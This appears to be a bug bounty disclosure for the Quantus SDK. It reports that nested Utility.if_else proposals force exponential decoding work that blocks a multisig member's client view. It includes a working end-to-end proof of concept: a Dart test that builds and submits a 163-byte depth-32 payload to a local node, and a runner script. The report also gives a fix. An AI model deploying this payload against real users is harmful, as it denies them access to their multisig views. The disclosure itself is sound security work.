# 89809 w a low nested utility if else proposal forces exponential work in the official sdk and temporarily disables a victim s multisig view

**Submitted on Aug 21st 2026 at 10:05:27 UTC by @legat for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89809
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/quantus\\_sdk>
* **Impacts:**
  * Temporarily disabling user to access target site, such as:
    * Locking up the victim from login
    * Cookie bombing, etc.

## Description

### Summary

The official SDK's `CallDecoder` describes the attacker-controlled primary branch of every `Utility.if_else` node twice: once to build the displayed nested field and again to obtain the summary. A linear-size chain of ordinary `if_else` calls therefore causes exponential synchronous work in the client.

The runnable PoC uses the exact frozen release node, exact frozen SDK, real Quantus key derivation/signing, and real multisig storage. An ordinary member creates a normal 2-of-2 multisig and submits one canonical depth-32 proposal. The node accepts and stores all 163 bytes, but the production `CallDecoder.decodeBytes()` does not return within eight seconds because it must perform exactly `12,884,901,886` description invocations.

The vulnerable decoder is called synchronously when the official mobile proposal flow hydrates authoritative `Multisig.Proposals` bytes and obtains `decodedCall.summary`. The narrow supported impact is temporary loss of access to the affected multisig view on the victim client. This report does not claim a global backend outage, chain halt, application-wide takedown, login compromise, or loss of funds.

### Intended behavior

Call review should take work proportional to the encoded call tree. Each nested child should be decoded/described once and its result reused for both the detailed tree and summary. A 163-byte canonical proposal should not monopolize the Flutter UI isolate.

### Actual behavior

At the frozen revision, the `IfElse` branch is:

```dart
case utility.IfElse(:final main, :final fallback):
  return DecodedCall(
    pallet: 'Utility',
    call: 'if_else',
    fields: [
      NestedCallField('Primary call', describe(main)),
      NestedCallField('Fallback call', describe(fallback)),
    ],
    summary: describe(main).summary,
  );
```

The first `describe(main)` creates the primary display tree. The second independently recreates the complete same tree merely to read `.summary`. Adjacent wrappers cache their child result, confirming that the second traversal has no display purpose.

Define:

```
C0 = System.remark([])
Cn = Utility.if_else(main = C(n-1), fallback = System.remark([]))
```

The SCALE size grows linearly:

```
size(Cn) = 3 + 5n bytes
```

Let `D(n)` be the number of `describe()` invocations:

```
D(0) = 1
D(n) = 1 + D(n-1) + 1 + D(n-1)
     = 2D(n-1) + 2
D(n) = 3 * 2^n - 2
```

| Depth | Encoded bytes | Exact description invocations |
| ----: | ------------: | ----------------------------: |
|    20 |           103 |                     3,145,726 |
|    24 |           123 |                    50,331,646 |
|    28 |           143 |                   805,306,366 |
|    30 |           153 |                 3,221,225,470 |
|    32 |           163 |                12,884,901,886 |

The generated SCALE decoder first parses only 65 small call nodes. The exponential behavior begins in Quantus-authored presentation logic after decoding.

### Root cause

The root is the duplicate recursive evaluation at [`call_decoder.dart:572-580`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L572-L580), specifically:

```dart
NestedCallField('Primary call', describe(main))
...
summary: describe(main).summary
```

The ordinary proposal consumer is [`multisig_service.dart:293-325`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/multisig_service.dart#L293-L325): it retrieves authoritative call bytes and synchronously evaluates `withBytes.decodedCall?.summary`.

The official mobile home flow watches open proposals through [`multisig_activity_section.dart:25-57`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_activity_section.dart#L25-L57). There is no isolate/`compute` boundary around this SDK description path in production.

## Risk

### Impact

One small canonical proposal makes the exact official SDK remain inside deterministic synchronous work for materially longer than a normal UI response window. When invoked by the mobile proposal provider on the UI isolate, the affected view cannot complete loading or respond normally during that work. Reopening or refreshing the same active multisig retriggers the same decode while the proposal remains active.

This maps to the selected Low impact only. The PoC does not establish service-wide unavailability for unrelated users, and local recovery bounds severity.

### Likelihood

Exploit complexity is low:

* one ordinary co-signer in a normal non-high-security multisig;
* one signed proposal and ordinary proposal fee/deposit;
* 163 canonical bytes, about 1.6% of the 10,240-byte call limit;
* no malformed SCALE, trailing bytes, privileged role, governance action, oracle, public-node traffic, or repeated request volume;
* no victim signature, approval, or execution is needed for the decoder sink.

The attacker cannot target unrelated users; the victim must load a multisig in which the attacker can create proposals. That membership boundary is reflected in the Low severity.

## Attack path

{% stepper %}
{% step %}

### Alice and Bob are ordinary members of a normal 2-of-2 multisig

Alice is malicious and Bob is the victim.
{% endstep %}

{% step %}

### Alice constructs `C32`

Alice constructs `C32` from canonical `System.remark([])` and `Utility.if_else` calls.
{% endstep %}

{% step %}

### Alice submits the proposal

Alice submits `multisig.propose` with the 163-byte inner call and a normal expiry.
{% endstep %}

{% step %}

### The runtime accepts and stores the call

The exact frozen runtime linearly decodes, weighs, and stores the call. Alice becomes the first approver; the proposal is active.
{% endstep %}

{% step %}

### Bob retrieves the authoritative proposal bytes

Bob's official proposal flow retrieves the proposal and replaces any indexer representation with exact bytes from `Multisig.Proposals`.
{% endstep %}

{% step %}

### The SDK enters the vulnerable recursion

`MultisigProposal.decodedCall` invokes `CallDecoder.decodeBytes`, which synchronously enters the vulnerable `describe()` recursion.
{% endstep %}

{% step %}

### The affected client view is temporarily blocked

The decoder must execute `12,884,901,886` description calls before returning, temporarily preventing the affected client view from completing normal work.
{% endstep %}
{% endstepper %}

The PoC proves steps 1-6 with a real signed transaction and storage equality, then safely kills the unchanged decoder after an eight-second non-return. Step 7 is the direct consequence of production calling that same synchronous function on the Flutter UI isolate.

## Preconditions

### External preconditions

* The victim uses the official SDK/mobile proposal flow for a multisig shared with the attacker.
* The ordinary proposal feed returns the active on-chain proposal, after which the SDK obtains authoritative storage bytes.

No malicious or private indexer behavior is required. The PoC does not depend on canceled-history retention.

### Internal preconditions

* A normal multisig accepts ordinary custom runtime-call bytes.
* The proposal remains active when the victim loads it.
* The client uses the frozen decoder.

## Affected code and complete flow

| Role                    | Code                                                                      | Effect                                                       |
| ----------------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------ |
| Vulnerable root         | `quantus_sdk/lib/src/chain/call_decoder.dart:572-580`                     | Describes `main` twice at every nested level                 |
| Authoritative hydration | `quantus_sdk/lib/src/services/multisig_service.dart:293-325`              | Fetches stored bytes and eagerly reads `decodedCall.summary` |
| Model decoder           | `quantus_sdk/lib/src/models/multisig_proposal.dart:258-275`               | Sends attacker bytes into `CallDecoder`                      |
| Mobile consumer         | `mobile-app/lib/v2/screens/multisig/multisig_activity_section.dart:25-57` | Watches proposals in normal home activity                    |
| Ingress/context         | `pallets/multisig/src/lib.rs:535-692`                                     | Accepts, charges for, and stores the canonical call          |

The runtime Utility and multisig pallets are impact carriers, not the submitted vulnerable asset.

## Recommended mitigation

Describe each branch once and reuse the primary summary:

```dart
case utility.IfElse(:final main, :final fallback):
  final decodedMain = describe(main);
  final decodedFallback = describe(fallback);
  return DecodedCall(
    pallet: 'Utility',
    call: 'if_else',
    fields: [
      NestedCallField('Primary call', decodedMain),
      NestedCallField('Fallback call', decodedFallback),
    ],
    summary: decodedMain.summary,
  );
```

Defense in depth:

1. Add a global node/depth/work budget shared by every recursive wrapper.
2. Cache each proposal's decoded display tree instead of repeatedly decoding through getters.
3. Decode list/history data lazily rather than all rows eagerly.
4. Keep bounded attacker-controlled parsing off the Flutter UI isolate.
5. Add depth-20 through depth-32 regression vectors and assert near-linear scaling.
6. Preserve authoritative chain bytes as the review source.

## Proof of Concept

### Proof boundary and topology

The PoC exercises the exact frozen release node/runtime spec 143, actual Quantus keys and SDK signing, real 2-of-2 multisig creation, real proposal inclusion, exact `Multisig.Proposals` bytes, and the exact production decoder.

One exact release node is sufficient. This report makes no consensus, validator-divergence, network-partition, P2P, or cluster-availability claim. The proof boundary is canonical storage, a signed proposal, the deterministic SDK/UI decode path, and timing. Additional validators cannot change the stored call bytes or client recurrence.

The isolate is only a kill-switch so the runner can terminate the unchanged synchronous production decoder. It does not mock, accelerate, delay, or replace the target. In production the same function runs without that safety boundary on the Flutter UI isolate.

The in-memory preferences and secure-storage adapters only provide the documented disposable Alice/Bob development mnemonics. They do not supply proposal data, chain state, decoder output, or timing.

### File layout

Place these files in the frozen apps checkout; keep the frozen chain checkout as sibling `audit-comp-quantus-chain`:

```
audit-comp-quantus-apps/
├── poc/quantus-report-1/run.sh
└── quantus_sdk/test/poc/recursive_if_else_node_e2e_test.dart
```

### Complete Dart E2E PoC

Save as `quantus_sdk/test/poc/recursive_if_else_node_e2e_test.dart`:

```dart
import 'dart:async';
import 'dart:io';
import 'dart:isolate';

import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:polkadart/polkadart.dart';
import 'package:quantus_sdk/generated/planck/pallets/multisig.dart' as multisig;
import 'package:quantus_sdk/generated/planck/planck.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  test('a tiny stored proposal causes exponential frozen-SDK work', () async {
    HttpOverrides.global = null;
    SharedPreferences.setMockInitialValues({});
    FlutterSecureStorage.setMockInitialValues({
      'mnemonic': AppConstants.crystalAlice,
      'mnemonic_1': AppConstants.crystalBob,
    });
    await QuantusSdk.init();
    RpcEndpointService().endpoints
      ..clear()
      ..add(Endpoint(url: 'http://127.0.0.1:9944'));

    final alicePair = HdWalletService().keyPairAtIndex(AppConstants.crystalAlice, 0);
    final bobPair = HdWalletService().keyPairAtIndex(AppConstants.crystalBob, 0);
    final alice = Account(walletIndex: 0, index: 0, name: 'Alice', accountId: alicePair.ss58Address);
    final bob = Account(walletIndex: 1, index: 0, name: 'Bob', accountId: bobPair.ss58Address);
    final service = MultisigService();
    final provider = Provider.fromUri(Uri.parse('http://127.0.0.1:9944'));
    final api = Planck(provider);
    final nonce = BigInt.from(DateTime.now().microsecondsSinceEpoch);
    final address = await service.predictMultisigAddress(
      signers: [alice.accountId, bob.accountId],
      threshold: 2,
      nonce: nonce,
    );
    final msig = MultisigAccount(
      name: 'PoC',
      accountId: address,
      signers: [alice.accountId, bob.accountId],
      threshold: 2,
      nonce: nonce,
      myMemberAccountId: bob.accountId,
    );
    await service.submitCreateMultisigExtrinsic(
      creator: alice,
      signers: msig.signers,
      threshold: msig.threshold,
      nonce: nonce,
    );
    await _waitFor(() async => await api.query.multisig.multisigs(getAccountId32(address)) != null);

    const depth = 32;
    var raw = <int>[0, 0, 0]; // System.remark(empty).
    for (var i = 0; i < depth; i++) {
      // Utility.if_else(main=previous level, fallback=remark(empty)).
      raw = <int>[9, 6, ...raw, 0, 0, 0];
    }
    expect(raw.length, 3 + 5 * depth);

    final current = await service.currentBlockNumber();
    await SubstrateService().submitExtrinsic(
      alice,
      const multisig.Txs().propose(multisigAddress: getAccountId32(address), call: raw, expiry: current + 100),
    );
    await _waitFor(() async => await api.query.multisig.proposals(getAccountId32(address), 0) != null);
    final stored = await service.fetchProposalCallBytes(msig: msig, proposalId: 0);
    expect(stored, raw);

    // CallDecoder.decodeBytes is synchronous in the official SDK. Run that exact
    // target function in an isolate solely so the test runner remains killable.
    final port = ReceivePort();
    final stopwatch = Stopwatch()..start();
    final isolate = await Isolate.spawn(_decodeWorker, <Object>[stored, port.sendPort]);
    final result = await Future.any<Object?>([
      port.first,
      Future<Object?>.delayed(const Duration(seconds: 8), () => 'TIMEOUT'),
    ]);
    stopwatch.stop();
    isolate.kill(priority: Isolate.immediate);
    port.close();

    final theoreticalDescriptions = BigInt.from(3) * (BigInt.one << depth) - BigInt.two;
    print(
      'depth=$depth stored_bytes=${stored.length} '
      'forced_descriptions=$theoreticalDescriptions '
      'decoder_result=$result elapsed_ms=${stopwatch.elapsedMilliseconds}',
    );
    expect(result, 'TIMEOUT');
    expect(theoreticalDescriptions, BigInt.parse('12884901886'));
    await provider.disconnect();
  }, timeout: const Timeout(Duration(minutes: 3)));
}

void _decodeWorker(List<Object> message) {
  final bytes = (message[0] as List).cast<int>();
  final sendPort = message[1] as SendPort;
  final stopwatch = Stopwatch()..start();
  final decoded = CallDecoder.decodeBytes(bytes);
  stopwatch.stop();
  sendPort.send('DONE:${decoded.pallet}:${stopwatch.elapsedMilliseconds}');
}

Future<void> _waitFor(Future<bool> Function() predicate) async {
  for (var i = 0; i < 90; i++) {
    if (await predicate()) return;
    await Future<void>.delayed(const Duration(seconds: 1));
  }
  throw TimeoutException('condition was not reached');
}
```

### Complete verifier and runner

Save as `poc/quantus-report-1/run.sh` and make executable:

```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
APPS_ROOT="$(cd -- "$SCRIPT_DIR/../.." && pwd)"
CHAIN_ROOT="$(cd -- "$APPS_ROOT/../audit-comp-quantus-chain" && pwd)"
SDK_ROOT="$APPS_ROOT/quantus_sdk"
TEST_FILE="$SDK_ROOT/test/poc/recursive_if_else_node_e2e_test.dart"
EVIDENCE_DIR="$SCRIPT_DIR/evidence"
RPC_URL="http://127.0.0.1:9944"
EXPECTED_APPS_COMMIT="d5fc4d6572ebc2244e95009a33f5da5048935867"
EXPECTED_CHAIN_COMMIT="3b243b870a5442a6e5f443056f67bbba87d472f5"
EXPECTED_DECODER_SHA="ca839c91880c91cc5cfcf1b792dfda207d6f575213f9e65219af514d67dbe53a"
EXPECTED_TEST_SHA="58d57609023d7407e080362279fa4c2ec63cfc6f6240eaae06786c64eacc7a9c"

hash_file() {
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    shasum -a 256 "$1" | awk '{print $1}'
  fi
}

[[ "$(git -C "$APPS_ROOT" rev-parse HEAD)" == "$EXPECTED_APPS_COMMIT" ]]
[[ "$(git -C "$CHAIN_ROOT" rev-parse HEAD)" == "$EXPECTED_CHAIN_COMMIT" ]]
[[ "$(hash_file "$SDK_ROOT/lib/src/chain/call_decoder.dart")" == "$EXPECTED_DECODER_SHA" ]]
[[ "$(hash_file "$TEST_FILE")" == "$EXPECTED_TEST_SHA" ]]

FLUTTER_BIN="${FLUTTER_BIN:-$(command -v flutter || true)}"
[[ -n "$FLUTTER_BIN" && -x "$FLUTTER_BIN" ]] || {
  echo "Flutter not found; put flutter on PATH or set FLUTTER_BIN" >&2
  exit 1
}

NODE_BIN="$CHAIN_ROOT/target/release/quantus-node"
if [[ ! -x "$NODE_BIN" ]]; then
  cargo build --release --bin quantus-node --manifest-path "$CHAIN_ROOT/Cargo.toml"
fi

if curl -fsS -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
  "$RPC_URL" >/dev/null 2>&1; then
  echo "Port 9944 already serves RPC; stop it before this isolated run" >&2
  exit 1
fi

mkdir -p "$EVIDENCE_DIR"
: >"$EVIDENCE_DIR/node.log"
: >"$EVIDENCE_DIR/e2e.log"
: >"$EVIDENCE_DIR/rpc.ndjson"

"$NODE_BIN" --dev --tmp --rpc-port 9944 --rpc-methods Unsafe --rpc-cors all -lerror \
  >"$EVIDENCE_DIR/node.log" 2>&1 &
NODE_PID=$!
cleanup() {
  if kill -0 "$NODE_PID" >/dev/null 2>&1; then
    kill "$NODE_PID" >/dev/null 2>&1 || true
    wait "$NODE_PID" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT INT TERM

for _ in $(seq 1 120); do
  if curl -fsS -H 'content-type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
    "$RPC_URL" >/dev/null 2>&1; then
    break
  fi
  sleep 0.25
done

for request in \
  '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
  '{"jsonrpc":"2.0","id":2,"method":"system_version","params":[]}' \
  '{"jsonrpc":"2.0","id":3,"method":"state_getRuntimeVersion","params":[]}' \
  '{"jsonrpc":"2.0","id":4,"method":"chain_getBlockHash","params":[0]}'
do
  curl -fsS -H 'content-type: application/json' --data "$request" "$RPC_URL" \
    | tee -a "$EVIDENCE_DIR/rpc.ndjson"
  echo >>"$EVIDENCE_DIR/rpc.ndjson"
done
rg -q '"specVersion":143' "$EVIDENCE_DIR/rpc.ndjson"

cd "$SDK_ROOT"
"$FLUTTER_BIN" test test/poc/recursive_if_else_node_e2e_test.dart --reporter expanded \
  2>&1 | tee "$EVIDENCE_DIR/e2e.log"

rg -q 'stored_bytes=163' "$EVIDENCE_DIR/e2e.log"
rg -q 'forced_descriptions=12884901886' "$EVIDENCE_DIR/e2e.log"
rg -q 'decoder_result=TIMEOUT' "$EVIDENCE_DIR/e2e.log"
rg -q 'All tests passed!' "$EVIDENCE_DIR/e2e.log"
echo "PASS: exact frozen node + SDK nested-if_else E2E"
```

Run:

```bash
cd poc/quantus-report-1
chmod +x run.sh
./run.sh
```

### Captured reference node fingerprint

```json
{"jsonrpc":"2.0","id":1,"result":{"peers":0,"isSyncing":false,"shouldHavePeers":false}}
{"jsonrpc":"2.0","id":2,"result":"0.8.0-exodus-3b243b870a5"}
{"jsonrpc":"2.0","id":3,"result":{"specName":"quantus-runtime","implName":"quantus-runtime","authoringVersion":1,"specVersion":143,"implVersion":1,"transactionVersion":3,"systemVersion":1,"stateVersion":1}}
{"jsonrpc":"2.0","id":4,"result":"0xbbffbd5377d630dd2608e411a16c0f45343948b861d78493863b98b901573155"}
```

The runtime-version line omits only the verbose `apis` array for readability; the runner records the complete unmodified RPC result.

### Captured reference E2E output

```
submitExtrinsic response: 0x07bbf5f6657a666322071037879412869a357f0710305994b3f760f7268aea3d
submitExtrinsic response: 0x38982735e3b3f0449b69c1df4ae0a5309af37ed2ed70b5246255a95c8c2f36f1
depth=32 stored_bytes=163 forced_descriptions=12884901886 decoder_result=TIMEOUT elapsed_ms=8005
00:38 +1: All tests passed!
```

The first hash is the real signed multisig-creation extrinsic; the second is the real signed proposal extrinsic. The test fails unless the proposal exists in runtime storage and retrieved bytes equal the submitted vector.

## Determinism and falsification conditions

Exact invariants are depth `32`, 65 call nodes, `163` encoded bytes, `12,884,901,886` descriptions, runtime spec `143`, and storage equality. Wall-clock time varies by CPU, so the test asserts the conservative fact that the unchanged decoder has not returned after eight seconds. A fixed implementation completes in linear work and makes the timeout assertion fail, serving as a negative control.

Reject or revise the report if the frozen node does not accept/store the exact call, the SDK fingerprint differs, the SDK completes the unchanged depth-32 description within the deadline, or the actual mobile flow no longer calls this decoder synchronously. None occurred in the reference run/source recheck.
